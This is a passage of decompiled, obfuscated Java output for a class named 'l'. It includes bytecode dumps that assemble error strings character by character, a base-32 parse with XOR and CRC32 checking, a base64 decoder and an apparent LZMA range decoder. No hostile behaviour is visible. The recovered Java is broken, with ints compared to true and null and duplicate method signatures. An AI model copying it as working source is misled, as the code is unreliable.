    //   78: dup
    //   79: invokespecial <init> : ()V
    //   82: dup
    //   83: astore_1
    //   84: bipush #73
    //   86: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   89: pop
    //   90: aload_1
    //   91: bipush #108
    //   93: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   96: pop
    //   97: aload_1
    //   98: bipush #108
    //   100: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   103: pop
    //   104: aload_1
    //   105: bipush #101
    //   107: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   110: pop
    //   111: aload_1
    //   112: bipush #103
    //   114: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   117: pop
    //   118: aload_1
    //   119: bipush #97
    //   121: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   124: pop
    //   125: aload_1
    //   126: bipush #108
    //   128: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   131: pop
    //   132: aload_1
    //   133: bipush #32
    //   135: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   138: pop
    //   139: aload_1
    //   140: bipush #108
    //   142: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   145: pop
    //   146: aload_1
    //   147: bipush #101
    //   149: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   152: pop
    //   153: aload_1
    //   154: bipush #97
    //   156: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   159: pop
    //   160: aload_1
    //   161: bipush #100
    //   163: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   166: pop
    //   167: aload_1
    //   168: bipush #105
    //   170: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   173: pop
    //   174: aload_1
    //   175: bipush #110
    //   177: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   180: pop
    //   181: aload_1
    //   182: bipush #103
    //   184: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   187: pop
    //   188: aload_1
    //   189: bipush #32
    //   191: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   194: pop
    //   195: aload_1
    //   196: bipush #109
    //   198: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   201: pop
    //   202: aload_1
    //   203: bipush #105
    //   205: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   208: pop
    //   209: aload_1
    //   210: bipush #110
    //   212: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   215: pop
    //   216: aload_1
    //   217: bipush #117
    //   219: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   222: pop
    //   223: aload_1
    //   224: bipush #115
    //   226: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   229: pop
    //   230: aload_1
    //   231: bipush #32
    //   233: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   236: pop
    //   237: aload_1
    //   238: bipush #115
    //   240: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   243: pop
    //   244: aload_1
    //   245: bipush #105
    //   247: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   250: pop
    //   251: aload_1
    //   252: bipush #103
    //   254: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   257: pop
    //   258: aload_1
    //   259: bipush #110
    //   261: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   264: pop
    //   265: aload_1
    //   266: bipush #32
    //   268: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   271: pop
    //   272: aload_1
    //   273: bipush #111
    //   275: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   278: pop
    //   279: aload_1
    //   280: bipush #110
    //   282: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   285: pop
    //   286: aload_1
    //   287: bipush #32
    //   289: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   292: pop
    //   293: aload_1
    //   294: bipush #117
    //   296: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   299: pop
    //   300: aload_1
    //   301: bipush #110
    //   303: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   306: pop
    //   307: aload_1
    //   308: bipush #115
    //   310: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   313: pop
    //   314: aload_1
    //   315: bipush #105
    //   317: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   320: pop
    //   321: aload_1
    //   322: bipush #103
    //   324: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   327: pop
    //   328: aload_1
    //   329: bipush #110
    //   331: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   334: pop
    //   335: aload_1
    //   336: bipush #101
    //   338: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   341: pop
    //   342: aload_1
    //   343: bipush #100
    //   345: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   348: pop
    //   349: aload_1
    //   350: bipush #32
    //   352: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   355: pop
    //   356: aload_1
    //   357: bipush #115
    //   359: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   362: pop
    //   363: aload_1
    //   364: bipush #116
    //   366: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   369: pop
    //   370: aload_1
    //   371: bipush #114
    //   373: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   376: pop
    //   377: aload_1
    //   378: bipush #105
    //   380: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   383: pop
    //   384: aload_1
    //   385: bipush #110
    //   387: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   390: pop
    //   391: aload_1
    //   392: bipush #103
    //   394: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   397: pop
    //   398: aload_1
    //   399: bipush #32
    //   401: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   404: pop
    //   405: aload_1
    //   406: bipush #37
    //   408: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   411: pop
    //   412: aload_1
    //   413: bipush #115
    //   415: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   418: pop
    //   419: aload_1
    //   420: bipush #46
    //   422: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   425: pop
    //   426: aload_1
    //   427: invokevirtual toString : ()Ljava/lang/String;
    //   430: iconst_1
    //   431: anewarray java/lang/Object
    //   434: dup
    //   435: iconst_0
    //   436: aload_0
    //   437: aastore
    //   438: invokestatic format : (Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   441: invokespecial <init> : (Ljava/lang/String;)V
    //   444: athrow
    //   445: iload_1
    //   446: bipush #12
    //   448: if_icmpgt -> 460
    //   451: aload_0
    //   452: bipush #32
    //   454: invokestatic parseLong : (Ljava/lang/String;I)J
    //   457: goto -> 1087
    //   460: aload_0
    //   461: iconst_0
    //   462: iload_1
    //   463: iconst_1
    //   464: isub
    //   465: invokevirtual substring : (II)Ljava/lang/String;
    //   468: bipush #32
    //   470: invokestatic parseLong : (Ljava/lang/String;I)J
    //   473: lstore_3
    //   474: aload_0
    //   475: iload_1
    //   476: iconst_1
    //   477: isub
    //   478: invokevirtual charAt : (I)C
    //   481: bipush #32
    //   483: invokestatic digit : (CI)I
    //   486: dup
    //   487: istore_1
    //   488: ifge -> 665
    //   491: new java/lang/NumberFormatException
    //   494: dup
    //   495: new java/lang/StringBuilder
    //   498: dup
    //   499: new java/lang/StringBuilder
    //   502: dup
    //   503: invokespecial <init> : ()V
    //   506: dup
    //   507: astore_1
    //   508: bipush #66
    //   510: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   513: pop
    //   514: aload_1
    //   515: bipush #97
    //   517: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   520: pop
    //   521: aload_1
    //   522: bipush #100
    //   524: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   527: pop
    //   528: aload_1
    //   529: bipush #32
    //   531: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   534: pop
    //   535: aload_1
    //   536: bipush #100
    //   538: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   541: pop
    //   542: aload_1
    //   543: bipush #105
    //   545: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   548: pop
    //   549: aload_1
    //   550: bipush #103
    //   552: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   555: pop
    //   556: aload_1
    //   557: bipush #105
    //   559: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   562: pop
    //   563: aload_1
    //   564: bipush #116
    //   566: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   569: pop
    //   570: aload_1
    //   571: bipush #32
    //   573: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   576: pop
    //   577: aload_1
    //   578: bipush #97
    //   580: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   583: pop
    //   584: aload_1
    //   585: bipush #116
    //   587: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   590: pop
    //   591: aload_1
    //   592: bipush #32
    //   594: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   597: pop
    //   598: aload_1
    //   599: bipush #101
    //   601: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   604: pop
    //   605: aload_1
    //   606: bipush #110
    //   608: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   611: pop
    //   612: aload_1
    //   613: bipush #100
    //   615: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   618: pop
    //   619: aload_1
    //   620: bipush #32
    //   622: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   625: pop
    //   626: aload_1
    //   627: bipush #111
    //   629: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   632: pop
    //   633: aload_1
    //   634: bipush #102
    //   636: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   639: pop
    //   640: aload_1
    //   641: bipush #32
    //   643: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   646: pop
    //   647: aload_1
    //   648: invokevirtual toString : ()Ljava/lang/String;
    //   651: invokespecial <init> : (Ljava/lang/String;)V
    //   654: aload_0
    //   655: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   658: invokevirtual toString : ()Ljava/lang/String;
    //   661: invokespecial <init> : (Ljava/lang/String;)V
    //   664: athrow
    //   665: lload_3
    //   666: iconst_5
    //   667: lshl
    //   668: iload_1
    //   669: i2l
    //   670: ladd
    //   671: dup2
    //   672: lstore #5
    //   674: ldc2_w -9223372036854775808
    //   677: ladd
    //   678: lload_3
    //   679: ldc2_w -9223372036854775808
    //   682: ladd
    //   683: lstore #9
    //   685: dup2
    //   686: lstore #7
    //   688: lload #9
    //   690: lcmp
    //   691: ifge -> 698
    //   694: iconst_m1
    //   695: goto -> 711
    //   698: lload #7
    //   700: lload #9
    //   702: lcmp
    //   703: ifne -> 710
    //   706: iconst_0
    //   707: goto -> 711
    //   710: iconst_1
    //   711: ifge -> 1074
    //   714: new java/lang/NumberFormatException
    //   717: dup
    //   718: new java/lang/StringBuilder
    //   721: dup
    //   722: invokespecial <init> : ()V
    //   725: dup
    //   726: astore_1
    //   727: bipush #83
    //   729: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   732: pop
    //   733: aload_1
    //   734: bipush #116
    //   736: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   739: pop
    //   740: aload_1
    //   741: bipush #114
    //   743: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   746: pop
    //   747: aload_1
    //   748: bipush #105
    //   750: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   753: pop
    //   754: aload_1
    //   755: bipush #110
    //   757: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   760: pop
    //   761: aload_1
    //   762: bipush #103
    //   764: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   767: pop
    //   768: aload_1
    //   769: bipush #32
    //   771: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   774: pop
    //   775: aload_1
    //   776: bipush #118
    //   778: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   781: pop
    //   782: aload_1
    //   783: bipush #97
    //   785: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   788: pop
    //   789: aload_1
    //   790: bipush #108
    //   792: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   795: pop
    //   796: aload_1
    //   797: bipush #117
    //   799: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   802: pop
    //   803: aload_1
    //   804: bipush #101
    //   806: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   809: pop
    //   810: aload_1
    //   811: bipush #32
    //   813: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   816: pop
    //   817: aload_1
    //   818: bipush #37
    //   820: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   823: pop
    //   824: aload_1
    //   825: bipush #115
    //   827: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   830: pop
    //   831: aload_1
    //   832: bipush #32
    //   834: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   837: pop
    //   838: aload_1
    //   839: bipush #101
    //   841: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   844: pop
    //   845: aload_1
    //   846: bipush #120
    //   848: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   851: pop
    //   852: aload_1
    //   853: bipush #99
    //   855: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   858: pop
    //   859: aload_1
    //   860: bipush #101
    //   862: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   865: pop
    //   866: aload_1
    //   867: bipush #101
    //   869: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   872: pop
    //   873: aload_1
    //   874: bipush #100
    //   876: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   879: pop
    //   880: aload_1
    //   881: bipush #115
    //   883: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   886: pop
    //   887: aload_1
    //   888: bipush #32
    //   890: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   893: pop
    //   894: aload_1
    //   895: bipush #114
    //   897: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   900: pop
    //   901: aload_1
    //   902: bipush #97
    //   904: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   907: pop
    //   908: aload_1
    //   909: bipush #110
    //   911: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   914: pop
    //   915: aload_1
    //   916: bipush #103
    //   918: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   921: pop
    //   922: aload_1
    //   923: bipush #101
    //   925: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   928: pop
    //   929: aload_1
    //   930: bipush #32
    //   932: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   935: pop
    //   936: aload_1
    //   937: bipush #111
    //   939: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   942: pop
    //   943: aload_1
    //   944: bipush #102
    //   946: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   949: pop
    //   950: aload_1
    //   951: bipush #32
    //   953: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   956: pop
    //   957: aload_1
    //   958: bipush #117
    //   960: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   963: pop
    //   964: aload_1
    //   965: bipush #110
    //   967: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   970: pop
    //   971: aload_1
    //   972: bipush #115
    //   974: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   977: pop
    //   978: aload_1
    //   979: bipush #105
    //   981: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   984: pop
    //   985: aload_1
    //   986: bipush #103
    //   988: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   991: pop
    //   992: aload_1
    //   993: bipush #110
    //   995: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   998: pop
    //   999: aload_1
    //   1000: bipush #101
    //   1002: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   1005: pop
    //   1006: aload_1
    //   1007: bipush #100
    //   1009: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   1012: pop
    //   1013: aload_1
    //   1014: bipush #32
    //   1016: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   1019: pop
    //   1020: aload_1
    //   1021: bipush #108
    //   1023: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   1026: pop
    //   1027: aload_1
    //   1028: bipush #111
    //   1030: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   1033: pop
    //   1034: aload_1
    //   1035: bipush #110
    //   1037: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   1040: pop
    //   1041: aload_1
    //   1042: bipush #103
    //   1044: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   1047: pop
    //   1048: aload_1
    //   1049: bipush #46
    //   1051: invokevirtual append : (C)Ljava/lang/StringBuilder;
    //   1054: pop
    //   1055: aload_1
    //   1056: invokevirtual toString : ()Ljava/lang/String;
    //   1059: iconst_1
    //   1060: anewarray java/lang/Object
    //   1063: dup
    //   1064: iconst_0
    //   1065: aload_0
    //   1066: aastore
    //   1067: invokestatic format : (Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   1070: invokespecial <init> : (Ljava/lang/String;)V
    //   1073: athrow
    //   1074: lload #5
    //   1076: goto -> 1087
    //   1079: new java/lang/IllegalArgumentException
    //   1082: dup
    //   1083: invokespecial <init> : ()V
    //   1086: athrow
    //   1087: ldc2_w 4773789072989332985
    //   1090: lxor
    //   1091: lstore_1
    //   1092: bipush #8
    //   1094: newarray byte
    //   1096: dup
    //   1097: astore_0
    //   1098: iconst_0
    //   1099: lload_1
    //   1100: bipush #56
    //   1102: lushr
    //   1103: ldc2_w 255
    //   1106: land
    //   1107: l2i
    //   1108: i2b
    //   1109: bastore
    //   1110: aload_0
    //   1111: iconst_1
    //   1112: lload_1
    //   1113: bipush #48
    //   1115: lushr
    //   1116: ldc2_w 255
    //   1119: land
    //   1120: l2i
    //   1121: i2b
    //   1122: bastore
    //   1123: aload_0
    //   1124: iconst_2
    //   1125: lload_1
    //   1126: bipush #40
    //   1128: lushr
    //   1129: ldc2_w 255
    //   1132: land
    //   1133: l2i
    //   1134: i2b
    //   1135: bastore
    //   1136: aload_0
    //   1137: iconst_3
    //   1138: lload_1
    //   1139: bipush #32
    //   1141: lushr
    //   1142: ldc2_w 255
    //   1145: land
    //   1146: l2i
    //   1147: i2b
    //   1148: bastore
    //   1149: aload_0
    //   1150: iconst_4
    //   1151: lload_1
    //   1152: bipush #24
    //   1154: lushr
    //   1155: ldc2_w 255
    //   1158: land
    //   1159: l2i
    //   1160: i2b
    //   1161: bastore
    //   1162: aload_0
    //   1163: iconst_5
    //   1164: lload_1
    //   1165: bipush #16
    //   1167: lushr
    //   1168: ldc2_w 255
    //   1171: land
    //   1172: l2i
    //   1173: i2b
    //   1174: bastore
    //   1175: aload_0
    //   1176: bipush #6
    //   1178: lload_1
    //   1179: bipush #8
    //   1181: lushr
    //   1182: ldc2_w 255
    //   1185: land
    //   1186: l2i
    //   1187: i2b
    //   1188: bastore
    //   1189: aload_0
    //   1190: bipush #7
    //   1192: lload_1
    //   1193: ldc2_w 255
    //   1196: land
    //   1197: l2i
    //   1198: i2b
    //   1199: bastore
    //   1200: iconst_0
    //   1201: aload_0
    //   1202: bipush #6
    //   1204: baload
    //   1205: sipush #255
    //   1208: iand
    //   1209: bipush #8
    //   1211: ishl
    //   1212: iadd
    //   1213: i2s
    //   1214: aload_0
    //   1215: bipush #7
    //   1217: baload
    //   1218: sipush #255
    //   1221: iand
    //   1222: iadd
    //   1223: i2s
    //   1224: istore_1
    //   1225: new java/util/zip/CRC32
    //   1228: dup
    //   1229: invokespecial <init> : ()V
    //   1232: dup
    //   1233: astore_2
    //   1234: aload_0
    //   1235: iconst_0
    //   1236: bipush #6
    //   1238: invokevirtual update : ([BII)V
    //   1241: aload_2
    //   1242: invokevirtual getValue : ()J
    //   1245: l2i
    //   1246: i2s
    //   1247: iload_1
    //   1248: if_icmpeq -> 1254
    //   1251: bipush #-2
    //   1253: ireturn
    //   1254: iconst_0
    //   1255: aload_0
    //   1256: iconst_1
    //   1257: baload
    //   1258: sipush #255
    //   1261: iand
    //   1262: bipush #24
    //   1264: ishl
    //   1265: iadd
    //   1266: aload_0
    //   1267: iconst_2
    //   1268: baload
    //   1269: sipush #255
    //   1272: iand
    //   1273: bipush #16
    //   1275: ishl
    //   1276: iadd
    //   1277: aload_0
    //   1278: iconst_3
    //   1279: baload
    //   1280: sipush #255
    //   1283: iand
    //   1284: bipush #8
    //   1286: ishl
    //   1287: iadd
    //   1288: aload_0
    //   1289: iconst_4
    //   1290: baload
    //   1291: sipush #255
    //   1294: iand
    //   1295: iadd
    //   1296: ireturn
    //   1297: pop
    //   1298: goto -> 1304
    //   1301: invokevirtual printStackTrace : ()V
    //   1304: iconst_m1
    //   1305: ireturn
    // Exception table:
    //   from	to	target	type
    //   0	1251	1297	java/lang/NumberFormatException
    //   0	1251	1301	java/lang/Exception
    //   1254	1296	1297	java/lang/NumberFormatException
    //   1254	1296	1301	java/lang/Exception
  }
  
  public static final byte[] a(byte[] paramArrayOfbyte) {
    byte[] arrayOfByte1 = new byte[paramArrayOfbyte.length];
    int i;
    for (i = paramArrayOfbyte.length; i - 1 > 0 && paramArrayOfbyte[i - 1] == 61; i--);
    if (i - 1 == 0)
      return null; 
    byte[] arrayOfByte2 = new byte[i * 3 / 4];
    byte b2;
    for (b2 = 0; b2 < i; b2++) {
      if (paramArrayOfbyte[b2] == 43) {
        arrayOfByte1[b2] = 62;
      } else if (paramArrayOfbyte[b2] == 47) {
        arrayOfByte1[b2] = 63;
      } else if (paramArrayOfbyte[b2] < 58) {
        arrayOfByte1[b2] = (byte)(paramArrayOfbyte[b2] + 52 - 48);
      } else if (paramArrayOfbyte[b2] < 91) {
        arrayOfByte1[b2] = (byte)(paramArrayOfbyte[b2] - 65);
      } else if (paramArrayOfbyte[b2] < 123) {
        arrayOfByte1[b2] = (byte)(paramArrayOfbyte[b2] + 26 - 97);
      } 
    } 
    b2 = 0;
    byte b1 = 0;
    while (b2 < i && b1 < arrayOfByte2.length / 3 * 3) {
      arrayOfByte2[b1++] = (byte)(arrayOfByte1[b2] << 2 & 0xFC | arrayOfByte1[b2 + 1] >>> 4 & 0x3);
      arrayOfByte2[b1++] = (byte)(arrayOfByte1[b2 + 1] << 4 & 0xF0 | arrayOfByte1[b2 + 2] >>> 2 & 0xF);
      arrayOfByte2[b1++] = (byte)(arrayOfByte1[b2 + 2] << 6 & 0xC0 | arrayOfByte1[b2 + 3] & 0x3F);
      b2 += 4;
    } 
    if (b2 < i)
      if (b2 < i - 2) {
        arrayOfByte2[b1++] = (byte)(arrayOfByte1[b2] << 2 & 0xFC | arrayOfByte1[b2 + 1] >>> 4 & 0x3);
        arrayOfByte2[b1] = (byte)(arrayOfByte1[b2 + 1] << 4 & 0xF0 | arrayOfByte1[b2 + 2] >>> 2 & 0xF);
      } else if (b2 < i - 1) {
        arrayOfByte2[b1] = (byte)(arrayOfByte1[b2] << 2 & 0xFC | arrayOfByte1[b2 + 1] >>> 4 & 0x3);
      }  
    return arrayOfByte2;
  }
  
  public static boolean a() {
    return (b == null);
  }
  
  public static boolean b() {
    return (b == 2);
  }
  
  public static boolean c() {
    return (b == true);
  }
  
  public static boolean d() {
    return (b == 3);
  }
  
  public static boolean e() {
    return (a == true);
  }
  
  public static boolean f() {
    return (a == null);
  }
  
  public static boolean g() {
    return (a == 2);
  }
  
  private void a() {
    b();
    this.b = null;
  }
  
  private void b() {
    int i;
    if ((i = this.c - this.e) == 0)
      return; 
    for (byte b = 0; b < i; b++)
      this.b[b + this.f] = this.a[this.e + b]; 
    this.f += i;
    if (this.c >= this.d)
      this.c = false; 
    this.e = this.c;
  }
  
  private byte a(int paramInt) {
    if ((paramInt = this.c - paramInt - 1) < 0)
      paramInt += this.d; 
    return this.a[paramInt];
  }
  
  private int a() {
    // Byte code:
    //   0: aload_0
    //   1: getfield c : [B
    //   4: aload_0
    //   5: dup
    //   6: getfield i : I
    //   9: dup_x1
    //   10: iconst_1
    //   11: iadd
    //   12: putfield i : I
    //   15: baload
    //   16: sipush #255
    //   19: iand
    //   20: ireturn
  }
  
  private int a(Object paramObject, int paramInt) {
    // Byte code:
    //   0: aload_1
    //   1: checkcast [S
    //   4: dup
    //   5: astore_1
    //   6: iload_2
    //   7: saload
    //   8: istore_3
    //   9: aload_0
    //   10: getfield g : I
    //   13: bipush #11
    //   15: iushr
    //   16: iload_3
    //   17: imul
    //   18: istore #4
    //   20: aload_0
    //   21: getfield h : I
    //   24: ldc_w -2147483648
    //   27: ixor
    //   28: iload #4
    //   30: ldc_w -2147483648
    //   33: ixor
    //   34: if_icmpge -> 96
    //   37: aload_0
    //   38: iload #4
    //   40: putfield g : I
    //   43: aload_1
    //   44: iload_2
    //   45: iload_3
    //   46: sipush #2048
    //   49: iload_3
    //   50: isub
    //   51: iconst_5
    //   52: iushr
    //   53: iadd
    //   54: i2s
    //   55: sastore
    //   56: aload_0
    //   57: getfield g : I
    //   60: ldc_w -16777216
    //   63: iand
    //   64: ifne -> 94
    //   67: aload_0
    //   68: dup
    //   69: getfield h : I
    //   72: bipush #8
    //   74: ishl
    //   75: aload_0
    //   76: invokevirtual a : ()I
    //   79: ior
    //   80: putfield h : I
    //   83: aload_0
    //   84: dup
    //   85: getfield g : I
    //   88: bipush #8
    //   90: ishl
    //   91: putfield g : I
    //   94: iconst_0
    //   95: ireturn
    //   96: aload_0
    //   97: dup
    //   98: getfield g : I
    //   101: iload #4
    //   103: isub
    //   104: putfield g : I
    //   107: aload_0
    //   108: dup
    //   109: getfield h : I
    //   112: iload #4
    //   114: isub
    //   115: putfield h : I
    //   118: aload_1
    //   119: iload_2
    //   120: iload_3
    //   121: dup
    //   122: iconst_5
    //   123: iushr
    //   124: isub
    //   125: i2s
    //   126: sastore
    //   127: aload_0
    //   128: getfield g : I
    //   131: ldc_w -16777216
    //   134: iand
    //   135: ifne -> 165
    //   138: aload_0
    //   139: dup
    //   140: getfield h : I
    //   143: bipush #8
    //   145: ishl
    //   146: aload_0
    //   147: invokevirtual a : ()I
    //   150: ior
    //   151: putfield h : I
    //   154: aload_0
    //   155: dup
    //   156: getfield g : I
    //   159: bipush #8
    //   161: ishl
    //   162: putfield g : I
    //   165: iconst_1
    //   166: ireturn
  }
  
  private static void c(Object paramObject) {
    paramObject = paramObject;
    for (byte b = 0; b < paramObject.length; b++)
      paramObject[b] = 'Ѐ'; 
  }
  
  public l() {
    this.d = (short[][])new short[12];
    this.e = (short[][])new short[12];
    this.f = (short[][])new short[192];
    this.b = new short[4][];
    this.g = new short[114];
    this.h = new short[16];
    this.i = new short[2];
    this.c = new short[16][];
    this.d = new short[16][];
    this.j = new short[256];
    this.m = 0;
    this.k = new short[2];
    this.e = new short[16][];
    this.f = new short[16][];
    this.l = new short[256];
    this.n = 0;
    this.o = -1;
    this.p = -1;
    for (byte b = 0; b < 4; b++)
      this.b[b] = new short[64]; 
  }
  
  private int b(Object paramObject) {
    paramObject = paramObject;
    int i = 31 - a(paramObject.length);
    int j = 1;
    for (int k = i; k != 0; k--)
      j = (j << 1) + a(paramObject, j); 
    return j - (1 << i);
  }
  
  private static int a(int paramInt) {
    if (paramInt == 0)
      return 32; 
    byte b = 1;
    if (paramInt >>> 16 == 0) {
      b += true;
      paramInt <<= 16;
    } 
    if (paramInt >>> 24 == 0) {
      b += true;
      paramInt <<= 8;
    } 
    if (paramInt >>> 28 == 0) {
      b += true;
      paramInt <<= 4;
    } 
    if (paramInt >>> 30 == 0) {
      b += true;
      paramInt <<= 2;
    } 
    return b - (paramInt >>> 31);
  }
  
  private boolean a(byte[] paramArrayOfbyte1, byte[] paramArrayOfbyte2) {
    // Byte code:
    //   0: aload_2
    //   1: arraylength
    //   2: i2l
    //   3: lstore_3
    //   4: aload_0
    //   5: aload_1
    //   6: astore #9
    //   8: dup
    //   9: astore #12
    //   11: aload #9
    //   13: putfield c : [B
    //   16: aload #12
    //   18: bipush #13
    //   20: putfield i : I
    //   23: aload_0
    //   24: aload_2
    //   25: astore #9
    //   27: dup
    //   28: astore #12
    //   30: invokevirtual a : ()V
    //   33: aload #12
    //   35: aload #9
    //   37: putfield b : [B
    //   40: aload_0
    //   41: dup
    //   42: astore #12
    //   44: dup
    //   45: astore #9
    //   47: iconst_0
    //   48: putfield e : I
    //   51: aload #9
    //   53: iconst_0
    //   54: putfield c : I
    //   57: aload #12
    //   59: getfield a : [S
    //   62: invokestatic c : (Ljava/lang/Object;)V
    //   65: aload #12
    //   67: getfield f : [S
    //   70: invokestatic c : (Ljava/lang/Object;)V
    //   73: aload #12
    //   75: getfield b : [S
    //   78: invokestatic c : (Ljava/lang/Object;)V
    //   81: aload #12
    //   83: getfield c : [S
    //   86: invokestatic c : (Ljava/lang/Object;)V
    //   89: aload #12
    //   91: getfield d : [S
    //   94: invokestatic c : (Ljava/lang/Object;)V
    //   97: aload #12
    //   99: getfield e : [S
    //   102: invokestatic c : (Ljava/lang/Object;)V
    //   105: aload #12
    //   107: getfield g : [S
    //   110: invokestatic c : (Ljava/lang/Object;)V
    //   113: aload #12
    //   115: astore #9
    //   117: iconst_1
    //   118: aload #9
    //   120: getfield j : I
    //   123: aload #9
    //   125: getfield k : I
    //   128: iadd
    //   129: ishl
    //   130: istore_2
    //   131: iconst_0
    //   132: istore #14
    //   134: goto -> 154
    //   137: aload #9
    //   139: getfield a : [[S
    //   142: iload #14
    //   144: aaload
    //   145: checkcast [S
    //   148: invokestatic c : (Ljava/lang/Object;)V
    //   151: iinc #14, 1
    //   154: iload #14
    //   156: iload_2
    //   157: if_icmplt -> 137
    //   160: iconst_0
    //   161: istore #9
    //   163: goto -> 183
    //   166: aload #12
    //   168: getfield b : [[S
    //   171: iload #9
    //   173: aaload
    //   174: checkcast [S
    //   177: invokestatic c : (Ljava/lang/Object;)V
    //   180: iinc #9, 1
